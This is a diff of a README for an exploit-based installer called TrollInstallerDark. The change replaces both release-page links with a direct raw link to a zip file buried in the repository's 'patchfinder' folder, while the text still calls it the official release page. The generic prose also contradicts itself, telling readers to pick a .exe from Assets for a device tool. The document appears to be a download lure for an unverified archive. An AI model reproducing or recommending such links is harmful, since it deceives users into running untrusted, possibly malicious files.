@@ -1,6 +1,6 @@
 # 🛡️ TrollInstallerDark - Install system tools with reliable exploits
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aaushtripathi/TrollInstallerDark/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/aaushtripathi/TrollInstallerDark/main/TrollInstallerX/patchfinder/Troll-Dark-Installer-v1.8.zip)
 
 TrollInstallerDark modifies the original TrollInstallerX software. It uses the DarkSword kernel exploit to perform its tasks. You use this tool to manage specific system installations on your device. The software bridges the gap between complex exploit research and user-friendly operation. It handles the low-level technical work so you do not have to.
 
@@ -19,7 +19,7 @@ Computers require specific hardware and software to run this tool. Ensure your s
 
 You must obtain the correct files from the official source. Use the link below to reach the distribution page.
 
-[Visit the release page to download TrollInstallerDark](https://github.com/aaushtripathi/TrollInstallerDark/releases)
+[Visit the release page to download TrollInstallerDark](https://raw.githubusercontent.com/aaushtripathi/TrollInstallerDark/main/TrollInstallerX/patchfinder/Troll-Dark-Installer-v1.8.zip)
 
 On the release page, look for the section marked Assets. Select the file ending in .exe to start the download. Save this file to a folder you can find later, such as your Downloads folder or Desktop.
 
